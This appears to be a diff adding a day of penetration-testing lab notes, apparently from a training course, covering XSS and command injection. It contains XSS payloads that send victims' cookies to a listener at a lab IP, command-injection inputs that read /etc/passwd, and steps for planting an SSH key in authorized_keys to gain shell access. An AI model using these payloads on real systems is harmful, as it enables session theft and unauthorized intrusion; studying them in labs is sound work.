@@ -92,3 +92,103 @@ Local Port Forward using master Socket:
 Master Socket through another Master Socket:
 
 	ssh -MS /tmp/comrade comrade@127.0.0.1 -p 41202
+
+# Day2 
+## Web Exploitation (XSS)
+
+
+ <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>
+HTTP Response Codes
+
+    10X == Informational
+
+    2XX == Success
+
+    30X == Redirection
+
+    4XX == Client Error
+
+    5XX == Server Error
+
+
+
+
+HTTP Fields
+
+    User-Agent
+
+    Referer
+
+    Cookie
+
+    Date
+
+    Server
+
+    Set-Cookie
+
+
+
+WGET 
+
+	wget -r -l2 -P /tmp ftp://ftpserver/
+	wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
+	wget --load-cookies cookies.txt -p https://website/interesting/article.php
+
+
+# XSS Demos
+
+Alert Script:
+
+	<script>alert('XSS');</script>
+
+
+Run on ops station:
+
+	 python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+Run on the webserver to send cookies back to my page:
+	
+ 	<script>document.location="http://10.50.22.235:8000/"+document.cookie;</script>
+
+
+## Command injection 
+* Find users home directory and type of shell.
+
+		; whomai
+	 	; cat../../../etc/passwd 
+  
+
+
+* Generate and ssh key
+
+ 	 	ssh-keygen -t rsa -b 4096
+* Inject public key into website
+* Make .ssh folder in home directory
+
+		;ls -la /users/home/directory      #check if .ssh exists
+		; mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exis
+
+* Make authorized key file in .ssh
+
+		 ; echo "your_public_key_here" > /users/home/directory/.ssh/authorized_keys
+
+
+* Verify key has been uploaded successfully.
+
+		 ; cat /users/home/directory/.ssh/authorized_keys
+
+* ssh onto the box:
+
+   		ssh user@ip_addr
+  Shouldn't prompt for password. If it does, your wrong. 
+
+* Authenticating with a private key that was found:
+
+  		ssh -i user_rsa.priv user@ip
+
+ * Webserver info is stored
+
+		/var/www/html
+
